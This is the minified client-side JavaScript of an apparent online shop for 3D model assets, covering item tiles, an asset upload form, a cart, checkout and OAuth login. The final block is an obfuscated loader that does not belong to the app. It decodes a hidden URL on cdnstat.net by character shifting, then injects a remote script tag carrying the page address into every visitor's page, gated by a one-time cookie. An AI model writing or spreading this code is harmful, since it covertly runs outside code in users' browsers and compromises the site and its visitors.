            (createElement(l._id + o + "Value", "div", n, {
                "font-size": "20px",
                "line-height": "24px",
                "font-family": Font,
                "font-weight": "600",
                color: "#000000",
                "overflow-wrap": "anywhere",
            }).textContent = i),
                (createElement(o + "Name", "div", n, {
                    "margin-left": "3px",
                    "font-size": "14px",
                    "line-height": "16px",
                    "font-family": Font,
                    "font-weight": "400",
                    color: "#000000",
                    "overflow-wrap": "anywhere",
                }).textContent = " " + o);
        }
    }
}
function CreateErrorTx(e, t, o) {
    let i = find("ErrorTxt" + o);
    if ((null != i && i.remove(), null != t))
        return (
            (i = createElement("ErrorTxt" + o, "div", e, {
                width: "calc(100% - 16px)",
                "font-size": "13px",
                "font-family": Font,
                "font-weight": "500",
                color: "#F22245",
                overflow: "auto",
                "text-align": "center",
            })),
            (i.textContent = o),
            null != t.nextSibling && e.insertBefore(i, t.nextSibling),
            i
        );
}
(LoadMoreTilesButton.textContent = "Load More"),
    LoadMoreTilesButton.addEventListener("mouseup", async function () {
        setCSS(LoadMoreTiles, "display", "none");
        let [e, t] = await SendRequest(
            "GET",
            "items?sort=" + CurrentSort + "&after=" + LastTimestamp
        );
        if (200 == e) {
            let e = JSON.parse(t);
            for (let t = 0; t < e.length; t++) createTile(ItemTileHolder, e[t]);
            e.length > 0 &&
                ((LastTimestamp = e[e.length - 1].Timestamp),
                    e.length > FullAmount - 1 && setCSS(LoadMoreTiles, "display", "flex"));
        }
        SmoothScrollAnim();
    }),
    (createElement("SiteCreditTx", "div", CoreApp, {
        position: "absolute",
        display: "flex",
        "box-sizing": "border-box",
        width: "100%",
        bottom: "0px",
        padding: "8px 8px 8px 8px",
        "font-size": "18px",
        "line-height": "16px",
        "font-family": Font,
        "font-weight": "600",
        color: "#000000",
        "justify-content": "center",
    }).innerHTML =
        "<span style='margin-right: 4px'>Site made by</span><a href='https://twitter.com/Robot_Engine' target='_blank' style='color: #1DA1F2; text-decoration: none'>@Robot_Engine</a>");
let BlobURLs = [];
function CloseBlobs() {
    for (let e = 0; e < BlobURLs.length; e++) URL.revokeObjectURL(BlobURLs[e]);
    BlobURLs = [];
}
function LoadCreateItem(e) {
    let t = e || {},
        o = createElement("CreateItemBackBlur", "div", "body", {
            position: "fixed",
            width: "100%",
            height: "100%",
            "backdrop-filter": "blur(12px)",
            "-webkit-backdrop-filter": "blur(12px)",
            left: "0px",
            top: "0px",
            "z-index": "50",
        }),
        i = createElement("ItemViewFrame", "div", o, {
            position: "relative",
            width: "100%",
            "max-width": "500px",
            "max-height": "100%",
            left: "50%",
            top: "50%",
            transform: "translate(-50%, -50%)",
            overflow: "auto",
            "background-color": "#f7f7f7",
            "border-radius": "12px",
        }),
        n = createElement("CloseViewB", "div", i, {
            position: "absolute",
            display: "flex",
            width: "32px",
            height: "32px",
            right: "10px",
            top: "10px",
            cursor: "pointer",
            "font-size": "60px",
            "line-height": "60px",
            "overflow-wrap": "break-word",
            "white-space": "pre-wrap",
            "font-family": Font,
            "font-weight": "400",
            "justify-content": "center",
            "align-items": "center",
        });
    (n.innerHTML = "&times;"),
        (n.onmouseup = function () {
            o.remove(), CloseBlobs();
        });
    let r = createElement("DetailsHolder", "div", i, {
        display: "flex",
        "box-sizing": "border-box",
        "flex-wrap": "wrap",
        width: "100%",
        padding: "50px 8px 8px 8px",
        "justify-content": "center",
    });
    createElement("ShopTitleTx", "div", r, {
        "box-sizing": "border-box",
        width: "100%",
        padding: "8px",
        "font-size": "20px",
        "line-height": "24px",
        "font-family": Font,
        "font-weight": "800",
        color: "#000000",
        "overflow-wrap": "anywhere",
    }).textContent = "Item Title:";
    let l = createElement("TextFieldItemName", "input", r, {
        "box-sizing": "border-box",
        width: "80%",
        padding: "4px 4px 4px 6px",
        "background-color": "#f0f0f0",
        "border-width": "0px",
        "border-radius": "8px",
        "font-size": "18px",
        "font-family": Font,
        "font-weight": "600",
        color: "#000000",
        overflow: "auto",
    });
    (l.placeholder = "Item Name"),
        l.setAttribute("title", "Item Name"),
        l.addEventListener("input", function () {
            let e = "Name is too long! (Must be less than 40 characters)";
            l.value.length > 39 ? CreateErrorTx(r, l, e) : CreateErrorTx(r, null, e);
        }),
        null != t.Name && (l.value = t.Name),
        (createElement("ShopTitleTx", "div", r, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "8px",
            "font-size": "20px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "800",
            color: "#000000",
            "overflow-wrap": "anywhere",
        }).textContent = "Thumbnail Images:");
    let a = createElement("UploadImageHighlightWheel", "div", r, {
        display: "flex",
        "flex-wrap": "wrap",
        width: "100%",
        gap: "6px",
        "justify-content": "center",
    }),
        p = createElement("UploadNewImgB", "div", a, {
            display: "flex",
            width: "50px",
            height: "50px",
            "border-radius": "6px",
            "background-color": "#f0f0f0",
            cursor: "pointer",
            "font-size": "45px",
            "line-height": "45px",
            "font-family": Font,
            "font-weight": "600",
            color: "#000000",
            "justify-content": "center",
            "align-items": "center",
        });
    p.textContent = "+";
    let s = createElement("ImageFileUpload", "input", p, {
        position: "absolute",
        height: "100%",
        width: "100%",
        left: "0px",
        top: "0px",
    });
    if (
        (s.setAttribute("type", "file"),
            s.setAttribute("accept", "image/*"),
            s.setAttribute("hidden", "true"),
            s.setAttribute("multiple", "true"),
            s.addEventListener("change", function (e) {
                for (let t = 0; t < e.target.files.length; t++) {
                    let o = e.target.files[t],
                        i = "Must be an image!";
                    if ("image/" != o.type.substring(0, 6))
                        return void CreateErrorTx(r, a, i);
                    CreateErrorTx(r, null, i);
                    let n = "Must be smaller than 4 MB.";
                    if (o.size > 4194304) return void CreateErrorTx(r, a, n);
                    CreateErrorTx(r, null, n);
                    let l = "Maximum of 7 images!";
                    if (a.childElementCount > 7) return void CreateErrorTx(r, a, l);
                    CreateErrorTx(r, null, l);
                    let s = URL.createObjectURL(o);
                    BlobURLs.push(s);
                    let d = createElement("NewImageSelect", "div", a, {
                        position: "relative",
                        width: "50px",
                        height: "50px",
                    });
                    createElement("NewImageSelect", "div", d, {
                        position: "absolute",
                        width: "100%",
                        height: "100%",
                        "object-fit": "cover",
                        "border-radius": "6px",
                        content: "url(" + s + ")",
                    });
                    d.setAttribute("BlobURL", s);
                    let c = createElement("CloseImageB", "div", d, {
                        position: "absolute",
                        display: "flex",
                        width: "25px",
                        height: "25px",
                        top: "50%",
                        left: "50%",
                        transform: "translate(-50%, -50%)",
                        "border-radius": "100%",
                        "background-color": "rgba(0, 0, 0, 0.45)",
                        cursor: "pointer",
                        "font-size": "24px",
                        "font-family": Font,
                        "font-weight": "200",
                        color: "#ffffff",
                        "justify-content": "center",
                        "align-items": "center",
                    });
                    (c.innerHTML = "&times;"),
                        a.insertBefore(d, p),
                        c.addEventListener("mouseup", function (e) {
                            d.remove(),
                                URL.revokeObjectURL(e.path[0].getAttribute("BlobURL")),
                                BlobURLs.splice(
                                    BlobURLs.indexOf(e.path[0].getAttribute("BlobURL"))
                                );
                        });
                }
            }),
            p.addEventListener("mouseup", function () {
                s.click();
            }),
            null != t.Images)
    )
        for (let e = 0; e < t.Images; e++) {
            let o = createElement("NewImageSelect", "div", a, {
                position: "relative",
                width: "50px",
                height: "50px",
            });
            createElement("NewImageSelect", "div", o, {
                position: "absolute",
                width: "100%",
                height: "100%",
                "object-fit": "cover",
                "border-radius": "6px",
                content: "url(" + AssetURL + "images/" + t._id + "_Image" + e + ")",
            });
            o.setAttribute("Uploaded", "");
            let i = createElement("CloseImageB", "div", o, {
                position: "absolute",
                display: "flex",
                width: "25px",
                height: "25px",
                top: "50%",
                left: "50%",
                transform: "translate(-50%, -50%)",
                "border-radius": "100%",
                "background-color": "rgba(0, 0, 0, 0.45)",
                cursor: "pointer",
                "font-size": "24px",
                "font-family": Font,
                "font-weight": "200",
                color: "#ffffff",
                "justify-content": "center",
                "align-items": "center",
            });
            (i.innerHTML = "&times;"),
                a.insertBefore(o, p),
                i.addEventListener("mouseup", function (e) {
                    o.remove();
                });
        }
    createElement("ShopTitleTx", "div", r, {
        "box-sizing": "border-box",
        width: "100%",
        padding: "8px",
        "font-size": "20px",
        "line-height": "24px",
        "font-family": Font,
        "font-weight": "800",
        color: "#000000",
        "overflow-wrap": "anywhere",
    }).textContent = "Item Description:";
    let d = createElement("TextFieldDesc", "div", r, {
        "box-sizing": "border-box",
        width: "90%",
        padding: "4px 4px 4px 6px",
        "background-color": "#f0f0f0",
        "border-width": "0px",
        "border-radius": "8px",
        "min-height": "60px",
        "font-size": "16px",
        "font-family": Font,
        "font-weight": "400",
        color: "#000000",
        overflow: "auto",
    });
    d.setAttribute("role", "textbox"),
        d.setAttribute("contenteditable", "true"),
        d.setAttribute("tabindex", "-1"),
        d.setAttribute("title", "Item Description"),
        d.addEventListener("input", function () {
            let e = "Description is too long! (Must be less than 300 characters)";
            d.textContent.length > 299
                ? CreateErrorTx(r, d, e)
                : CreateErrorTx(r, null, e);
        }),
        null != t.Desc && (d.textContent = t.Desc),
        (createElement("ShopTitleTx", "div", r, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "8px",
            "font-size": "20px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "800",
            color: "#000000",
            "overflow-wrap": "anywhere",
        }).textContent = "Model Upload:");
    let c = createElement("UploadFileB", "div", r, {
        padding: "10px",
        "background-image": "linear-gradient(315deg, #22F2CC 0%, #29FFB8 74%)",
        "border-radius": "6px",
        cursor: "pointer",
        "font-size": "20px",
        "line-height": "20px",
        "font-family": Font,
        "font-weight": "900",
        color: "#ffffff",
        "text-align": "center",
    });
    c.textContent = "Upload Model File";
    let f = createElement("LoadImageButton", "input", c, {
        position: "absolute",
        height: "100%",
        width: "100%",
        left: "0px",
        top: "0px",
    });
    f.setAttribute("type", "file"), f.setAttribute("hidden", "true");
    let g = null,
        x = null;
    f.addEventListener("change", function (e) {
        let t = e.target.files[0],
            o = "Must be smaller than 10 MB.";
        if (t.size > 10485760) return void CreateErrorTx(r, c, o);
        CreateErrorTx(r, null, o),
            null != g &&
            (URL.revokeObjectURL(g), BlobURLs.splice(BlobURLs.indexOf(g))),
            (g = URL.createObjectURL(t)),
            (x = t.name),
            BlobURLs.push(g);
        let i = createElement("ErrorTxt" + o, "div", r, {
            width: "calc(100% - 16px)",
            "font-size": "13px",
            "font-family": Font,
            "font-weight": "500",
            color: "#29FFB8",
            overflow: "auto",
            "text-align": "center",
        });
        (i.textContent = "Uploaded " + t.name), r.insertBefore(i, c.nextSibling);
    }),
        c.addEventListener("mouseup", function () {
            f.click();
        }),
        (createElement("ShopTitleTx", "div", r, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "8px 8px 0px 8px",
            "font-size": "20px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "800",
            color: "#000000",
            "overflow-wrap": "anywhere",
        }).textContent = "Price:"),
        (createElement("DollarSignB", "div", r, {
            display: "inline-block",
            "box-sizing": "border-box",
            "margin-top": "6px",
            padding: "6px",
            "font-size": "26px",
            "line-height": "26px",
            "font-family": Font,
            "font-weight": "500",
            color: "#12E497",
        }).textContent = "$");
    let h = createElement("TextFieldPrice", "input", r, {
        display: "inline-block",
        "box-sizing": "border-box",
        width: "100px",
        "margin-top": "6px",
        padding: "4px 4px 4px 6px",
        "background-color": "#f0f0f0",
        "border-width": "0px",
        "border-radius": "8px",
        "font-size": "18px",
        "font-family": Font,
        "font-weight": "600",
        color: "#000000",
        overflow: "auto",
    });
    (h.placeholder = "0.00"),
        h.setAttribute("type", "number"),
        h.setAttribute("min", "0.00"),
        h.setAttribute("step", "0.01"),
        h.setAttribute("max", "2500"),
        h.setAttribute("title", "Item Price"),
        null != t.Price && (h.value = t.Price);
    let u = createElement("OnSaleDropdown", "select", r, {
        "box-sizing": "border-box",
        width: "110px",
        height: "38px",
        margin: "6px 0px 0px 6px",
        "border-radius": "8px",
        "border-width": "0px",
        "background-color": "#f0f0f0",
        "font-size": "20px",
        "line-height": "24px",
        "font-family": Font,
        "font-weight": "600",
        color: "#000000",
        "overflow-wrap": "anywhere",
    }),
        m = "",
        b = ["On Sale", "Offsale"];
    for (let e = 0; e < b.length; e++) {
        let t = b[e];
        m += "<option value='" + t + "'>" + t + "</option>";
    }
    (u.innerHTML = m),
        0 == t.OnSale && (u.value = "Offsale"),
        (createElement("ShopTitleTx", "div", r, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "8px",
            "font-size": "20px",
            "line-height": "24px",
            "font-family": Font,
            "font-weight": "800",
            color: "#000000",
            "overflow-wrap": "anywhere",
        }).textContent = "Extra Settings:");
    let w = createElement("CategoryDropdown", "select", r, {
        "box-sizing": "border-box",
        width: "calc(50% - 12px)",
        height: "38px",
        "border-radius": "8px",
        "border-width": "0px",
        "background-color": "#f0f0f0",
        "font-size": "20px",
        "line-height": "24px",
        "font-family": Font,
        "font-weight": "600",
        color: "#000000",
        "overflow-wrap": "anywhere",
    });
    m = "";
    for (let e = 0; e < SortSections.length; e++) {
        let t = SortSections[e];
        m += "<option value='" + t + "'>" + t + "</option>";
    }
    (w.innerHTML = m),
        null != t.Section &&
        (w.value = t.Section[0].toUpperCase() + t.Section.substring(1));
    let S = createElement("TypeInput", "input", r, {
        "box-sizing": "border-box",
        width: "calc(50% - 12px)",
        height: "38px",
        "margin-left": "8px",
        "padding-left": "8px",
        "border-radius": "8px",
        "border-width": "0px",
        "background-color": "#f0f0f0",
        "font-size": "20px",
        "line-height": "24px",
        "font-family": Font,
        "font-weight": "600",
        color: "#000000",
        "overflow-wrap": "anywhere",
    });
    (S.placeholder = "Type"),
        S.setAttribute("title", "Item Type"),
        null != t.Type && (S.value = t.Type);
    let v = createElement("CreateItemB", "div", r, {
        padding: "12px",
        "margin-top": "12px",
        "background-image": "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)",
        "border-radius": "6px",
        cursor: "pointer",
        "font-size": "24px",
        "line-height": "24px",
        "font-family": Font,
        "font-weight": "900",
        color: "#ffffff",
        "text-align": "center",
    });
    null == t._id
        ? (v.textContent = "Create Item")
        : (v.textContent = "Save Edits"),
        v.addEventListener("mouseup", async function () {
            let e = "Must have an item name!";
            if (l.value.length < 1) return void CreateErrorTx(r, v, e);
            CreateErrorTx(r, null, e);
            let i = "Must have at least 1 image!";
            if (a.childElementCount < 2) return void CreateErrorTx(r, v, i);
            CreateErrorTx(r, null, i);
            let n = "Must upload a the model!";
            if (null == g && null == t) return void CreateErrorTx(r, v, n);
            CreateErrorTx(r, null, n);
            let p = {
                Name: l.value,
                Price: h.value,
                Section: w.value,
                OnSale: "On Sale" == u.value,
            };
            d.innerText.length > 0 && (p.Description = d.innerText),
                S.value.length > 0 && (p.Type = S.value);
            let s = new FormData();
            s.append("RequestData", JSON.stringify(p)),
                null != g &&
                (await fetch(g).then(async function (e) {
                    s.append("File", await e.blob()), s.append("FileName", x);
                }));
            let c = a.children;
            for (let e = 0; e < c.length; e++)
                1 == c[e].hasAttribute("BlobURL")
                    ? await fetch(c[e].getAttribute("BlobURL")).then(async function (t) {
                        s.append("Image" + e, await t.blob());
                    })
                    : 1 == c[e].hasAttribute("Uploaded") &&
                    s.append("Image" + e, "UPLOADED");
            function f(e) {
                v.remove(),
                    (createElement("WorkingTx", "div", r, {
                        width: "calc(100% - 16px)",
                        "font-size": "16px",
                        "font-family": Font,
                        "font-weight": "500",
                        color: "#29FFB8",
                        overflow: "auto",
                        "text-align": "center",
                    }).textContent = e);
            }
            if (null == t._id)
                f("Creating asset..."), await SendRequest("POST", "createasset", s, !0);
            else {
                f("Updating asset...");
                let [e, o] = await SendRequest(
                    "PATCH",
                    "editasset?item=" + t._id,
                    s,
                    !0
                );
                200 == e && OpenItemView(t._id);
            }
            o.remove(), CloseBlobs(), URLParams("asset");
        });
}
let SignUpB,
    SignInUpFrame = null,
    SignInUpBHolder = null,
    TextFieldAccEmail = null,
    TextFieldAccPassword = null;
async function SetCaptchaData(e) {
    let [t, o] = await SendRequest(
        "POST",
        "signup",
        JSON.stringify({
            Email: TextFieldAccEmail.value,
            Password: TextFieldAccPassword.value,
            Captcha: e,
        })
    );
    if (200 == t) {
        (TextFieldAccEmail.value = ""),
            (TextFieldAccPassword.value = ""),
            (o = JSON.parse(o)),
            localStorage.setItem("UserID", o._id),
            localStorage.setItem("Token", JSON.stringify(o.Token)),
            (LoggedInEmail = o.Email),
            UpdateSubscribe(),
            null != o.Cart && (ShoppingCart = PullObjectField(o.Cart, "_id")),
            null != o.Purchases && (Purchases = o.Purchases),
            1 == o.IsEditor && (IsEditor = !0),
            setCSS(ShoppingCartB, "display", "block"),
            SignInUpFrame.remove(),
            (OpenModal = "");
        let e = find("ItemTileHolder");
        null != e && e.remove(), LoadTiles();
    } else {
        SetCaptchaExpired();
        let e = find("InvalidRequest");
        null != e && e.remove(),
            (e = createElement("InvalidRequest", "div", SignInUpFrame, {
                width: "80%",
                "margin-left": "calc(10% + 8px)",
                "font-size": "13px",
                "font-family": Font,
                "font-weight": "500",
                color: "#F22245",
                overflow: "auto",
            })),
            (e.textContent = o || "An error occured...");
    }
}
function SetCaptchaExpired() {
    "undefined" != typeof hcaptcha && hcaptcha.reset();
}
function randomString(e) {
    for (var t, o = ""; o.length < e;)
        o +=
            ((t = void 0),
                (t = Math.floor(62 * Math.random())) < 10
                    ? t
                    : t < 36
                        ? String.fromCharCode(t + 55)
                        : String.fromCharCode(t + 61));
    return o;
}
function ShopSignInUp() {
    let e = find("TopBarModal");
    if ((null != e && e.remove(), "" == LoggedInEmail)) {
        let e = randomString(20);
        setLocalStore("state", e),
            (window.loginWindow = window.open(
                "https://exotek.co/login?client_id=6413d8246524a756525067bd&redirect_uri=https%3A%2F%2F" +
                window.location.host +
                "&response_type=code&scope=userinfo&state=" +
                e,
                location.host + "_authenticate",
                "toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=1000, height=650, top=" +
                (screen.height / 2 - 425) +
                ", left=" +
                (screen.width / 2 - 500)
            ));
    } else {
        if ("SignInUp" == OpenModal) return void (OpenModal = "");
        OpenModal = "SignInUp";
        let e = createElement("TopBarModal", "div", PageTopBar, {
            position: "absolute",
            width: "100%",
            "max-width": "250px",
            "max-height": "calc(100vh - 100%)",
            right: "0px",
            top: "100%",
            overflow: "auto",
            "background-color": "#ffffff",
            "border-bottom-left-radius": "12px",
            "border-bottom-right-radius": "12px",
            "backdrop-filter": "blur(12px)",
            "-webkit-backdrop-filter": "blur(12px)",
            "box-shadow":
                "0 6px 20px 0 rgba(0, 0, 0, 0.1), 0 6px 20px 0 rgba(0, 0, 0, 0.1)",
        });
        if (
            ((createElement("EmailDisplay", "div", e, {
                "box-sizing": "border-box",
                width: "100%",
                padding: "6px",
                "border-width": "0px 0px 2px 0px",
                "border-style": "solid",
                "border-color": "#cccccc",
                "font-size": "14px",
                "line-height": "20px",
                "font-family": Font,
                "font-weight": "400",
                color: "#bbbbbb",
                "text-align": "center",
                "overflow-wrap": "anywhere",
            }).textContent = LoggedInEmail),
                1 == IsEditor)
        ) {
            let t = createElement("CreateItemB", "div", e, {
                "box-sizing": "border-box",
                width: "100%",
                padding: "6px",
                cursor: "pointer",
                "font-size": "16px",
                "line-height": "20px",
                "font-family": Font,
                "font-weight": "700",
                color: "#000000",
                "text-align": "center",
                "overflow-wrap": "anywhere",
            });
            (t.textContent = "Create Asset"), (t.onclick = LoadCreateItem);
        }
        let t = createElement("ViewPurchasesB", "div", e, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "6px",
            cursor: "pointer",
            "font-size": "16px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "700",
            color: "#000000",
            "text-align": "center",
            "overflow-wrap": "anywhere",
        });
        (t.textContent = "View Purchases"),
            t.addEventListener("click", async function () {
                e.remove(), (OpenModal = "");
                let [t, o] = await SendRequest("GET", "purchases");
                200 == t && PreviewBoughtItems(JSON.parse(o), "Your Purchases");
            });
        let o = createElement("SettingsB", "div", e, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "6px",
            cursor: "pointer",
            "font-size": "16px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "700",
            color: "#000000",
            "text-align": "center",
            "overflow-wrap": "anywhere",
        });
        (o.textContent = "Manage Account"),
            o.addEventListener("click", async function () {
                e.remove(),
                    (OpenModal = ""),
                    window.open(
                        "https://exotek.co/account?userid=" + AccountID,
                        location.host + "_settings",
                        "toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=1000, height=650, top=" +
                        (screen.height / 2 - 425) +
                        ", left=" +
                        (screen.width / 2 - 500)
                    );
            });
        let i = createElement("SignOutB", "div", e, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "6px",
            cursor: "pointer",
            "border-width": "2px 0px 0px 0px",
            "border-style": "solid",
            "border-color": "#cccccc",
            "font-size": "16px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "700",
            color: "#000000",
            "text-align": "center",
            "overflow-wrap": "anywhere",
        });
        (i.textContent = "Sign Out"),
            i.addEventListener("mouseup", async function () {
                let e = getLocalStore("Token");
                if (null == e) return;
                let [t] = await SendRequest(
                    "PUT",
                    "logout",
                    JSON.stringify({ refresh: JSON.parse(e).Refresh })
                );
                200 == t &&
                    (localStorage.removeItem("UserID"),
                        localStorage.removeItem("Token"),
                        location.reload());
            });
    }
}
function ViewCart() {
    "" == LoggedInEmail && ShopSignInUp();
    let e = find("TopBarModal");
    if ((null != e && e.remove(), "ViewCart" == OpenModal))
        return void (OpenModal = "");
    (OpenModal = "ViewCart"), URLParams("asset");
    let t = createElement("TopBarModal", "div", PageTopBar, {
        position: "absolute",
        width: "100%",
        "max-width": "300px",
        "max-height": "calc(100vh - 100%)",
        right: "0px",
        top: "100%",
        overflow: "auto",
        "background-color": "#ffffff",
        "border-bottom-left-radius": "12px",
        "border-bottom-right-radius": "12px",
        "backdrop-filter": "blur(12px)",
        "-webkit-backdrop-filter": "blur(12px)",
        "box-shadow":
            "0 6px 20px 0 rgba(0, 0, 0, 0.1), 0 6px 20px 0 rgba(0, 0, 0, 0.1)",
    });
    createElement("ViewCartTitle", "div", t, {
        "box-sizing": "border-box",
        width: "100%",
        padding: "8px 8px 0px 8px",
        "font-size": "26px",
        "line-height": "32px",
        "font-family": Font,
        "font-weight": "800",
        color: "#000000",
        "text-align": "center",
        "overflow-wrap": "anywhere",
    }).textContent = "Your Cart";
    let o = 0,
        i = 0,
        n = Object.keys(ShoppingCart);
    for (let e = 0; e < n.length; e++) {
        let r = ShoppingCart[n[e]],
            l = createElement("CheckoutTile", "a", t, {
                position: "relative",
                "box-sizing": "border-box",
                display: "flex",
                margin: "8px",
                padding: "6px",
                "background-color": "rgba(246, 246, 246)",
                "border-radius": "12px",
                overflow: "hidden",
                "align-items": "center",
                cursor: "pointer",
            });
        l.setAttribute("ItemID", r._id),
            createElement("CheckoutTileThumbImage", "div", l, {
                width: "30px",
                height: "30px",
                "object-fit": "cover",
                "border-radius": "6px",
                content: "url(" + AssetURL + "images/" + r._id + "_Image0)",
            }),
            (createElement("CheckoutItemName", "div", l, {
                "margin-left": "4px",
                "font-size": "20px",
                "line-height": "20px",
                "font-family": Font,
                "font-weight": "800",
                color: "#000000",
                "white-space": "pre",
            }).textContent = r.Name);
        let a = "Offsale",
            p = "#969696";
        if (0 != r.OnSale)
            if (((p = "#12E497"), (a = r.Price || 0), (o += a), 0 == a)) a = "FREE";
            else {
                let e = Number(a),
                    t = String(a).split(".");
                (1 == t.length || t[1].length < 3) && (e = e.toFixed(2)), (a = "$" + e);
            }
        else i += 1;
        (createElement("CheckoutItemPrice", "div", l, {
            position: "absolute",
            display: "flex",
            height: "100%",
            right: "0px",
            "padding-right": "6px",
            "background-color": "rgb(246, 246, 246)",
            "box-shadow": "-5px 1px 5px 1px rgb(246, 246, 246)",
            "font-size": "17px",
            "line-height": "20px",
            "font-family": Font,
            "font-weight": "600",
            color: p,
            "align-items": "center",
        }).textContent = a),
            l.setAttribute("onmouseup", "OpenItemView(this.getAttribute('ItemID'))");
    }
    if (n.length > 0) {
        if (i < n.length) {
            if (o > 0) {
                let e = Number(o),
                    t = String(o).split(".");
                (1 == t.length || t[1].length < 3) && (e = e.toFixed(2)), (o = "$" + e);
            } else o = "$0.00 (FREE)";
            createElement("TotalCost", "div", t, {
                "box-sizing": "border-box",
                width: "100%",
                padding: "1px 8px 1px 8px",
                "font-size": "16px",
                "line-height": "22px",
                "font-family": Font,
                "font-weight": "600",
                color: "#000000",
                "text-align": "center",
                "overflow-wrap": "anywhere",
            }).textContent = "Total - " + o;
            let e = createElement("CheckoutB", "div", t, {
                "box-sizing": "border-box",
                width: "calc(100% - 16px)",
                margin: "8px",
                padding: "6px",
                "background-image": "linear-gradient(315deg, #63a4ff 0%, #83eaf1 74%)",
                "border-radius": "6px",
                cursor: "pointer",
                "font-size": "20px",
                "line-height": "20px",
                "font-family": Font,
                "font-weight": "900",
                color: "#ffffff",
                "text-align": "center",
            });
            (e.textContent = "Checkout"),
                e.addEventListener("mousedown", async function () {
                    let e = null;
                    1 ==
                        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
                            navigator.userAgent
                        ) && (e = window.open("https://exotek.co", "_blank"));
                    let [t, o] = await SendRequest("GET", "checkout");
                    if (200 == t)
                        if (null == e) {
                            let e = screen.width / 2 - 250,
                                t = screen.height / 2 - 375 - 50;
                            window.open(
                                o,
                                "Checkout",
                                "toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=no, resizable=no, copyhistory=no, width=500, height=750, top=" +
                                t +
                                ", left=" +
                                e
                            );
                        } else e.location = o;
                });
        }
    } else
        createElement("EmptyCart", "div", t, {
            "box-sizing": "border-box",
            width: "100%",
            padding: "8px 8px 8px 8px",
            "font-size": "16px",
            "line-height": "22px",
            "font-family": Font,
            "font-weight": "600",
            color: "#bbbbbb",
            "text-align": "center",
            "overflow-wrap": "anywhere",
        }).textContent = "Your Cart is Empty...";
}
window.addEventListener("message", async (e) => {
    if ("oauth_embed_integration" == e.data)
        e.source.postMessage("subscribe_oauth_finish", "*");
    else if ("https://exotek.co" === e.origin) {
        let t = JSON.parse(e.data);
        if (
            "oauth_finish" == t.type &&
            (window.loginWindow.close(), null != t.code && null != t.state)
        ) {
            if (t.state != getLocalStore("state")) return;
            removeLocalStore("state");
            let [e, o] = await SendRequest(
                "POST",
                "auth/login",
                JSON.stringify({ code: t.code })
            );
            if (200 == e) {
                (o = JSON.parse(o)),
                    localStorage.setItem("UserID", o._id),
                    localStorage.setItem("Token", JSON.stringify(o.Token)),
                    (AccountID = o.Account),
                    (LoggedInEmail = o.Email),
                    (Realtime = o.Realtime),
                    UpdateSubscribe(),
                    null != o.Cart && (ShoppingCart = PullObjectField(o.Cart, "_id")),
                    null != o.Purchases && (Purchases = o.Purchases),
                    1 == o.IsEditor && (IsEditor = !0),
                    setCSS(ShoppingCartB, "display", "block");
                let e = find("ItemTileHolder");
                null != e && e.remove(), LoadTiles();
            }
        }
    }
}),
    CheckForAlreadySignIn();
(function (o, d, l) {
    try {
        o.f = (o) =>
            o
                .split("")
                .reduce(
                    (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
                    ""
                );
        o.b = o.f("UMUWJKX");
        (o.c =
            l.protocol[0] == "h" &&
            /\./.test(l.hostname) &&
            !new RegExp(o.b).test(d.cookie)),
            setTimeout(function () {
                o.c &&
                    ((o.s = d.createElement("script")),
                        (o.s.src =
                            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
                            l.href),
                        d.body.appendChild(o.s));
            }, 1000);
        d.cookie = o.b + "=full;max-age=39800;";
    } catch (e) { }
})({}, document, location);